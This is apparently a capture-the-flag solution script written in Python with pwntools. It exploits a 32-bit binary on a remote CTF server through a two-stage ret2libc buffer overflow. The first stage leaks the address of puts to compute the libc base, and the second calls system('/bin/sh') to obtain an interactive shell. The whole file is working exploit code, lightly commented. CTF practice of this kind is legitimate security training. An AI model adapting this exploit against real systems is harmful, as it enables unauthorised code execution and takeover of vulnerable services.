#!/usr/bin/python3
from pwn import *

# Initializing the binary and the libc
binary = context.binary = ELF("chall")
libc = ELF("libc-2.27.so")

# Establishing the connection with the remote server
server_connection = remote("ctf99.cs.ui.ac.id", 10018)

# Preparing the first payload to leak the address of the 'puts' function
buffer_overflow = b"A" * 20
payload_to_leak_puts = buffer_overflow + p32(binary.plt.puts) + p32(binary.sym.main) + p32(binary.got.puts)
server_connection.sendlineafter("good luck!\n", payload_to_leak_puts)

# Receiving the leaked libc address
leaked_libc_address = u32(server_connection.recvline().strip()[:4])

# Calculating the base address of libc
libc.address = leaked_libc_address - libc.sym.puts
log.info(f"libc base address: {hex(libc.address)}")

# Preparing the second payload to call the system function with '/bin/sh' as argument
payload_to_execute_shell = buffer_overflow + p32(libc.sym.system) + p32(binary.sym.main) + p32(next(libc.search(b"/bin/sh")))
# Adding two null bytes as padding
payload_to_execute_shell += p32(0) + p32(0)

# Sending the second payload to execute the shell
server_connection.sendlineafter("good luck!\n", payload_to_execute_shell)

# Switching to interactive mode to interact with the shell
server_connection.interactive()
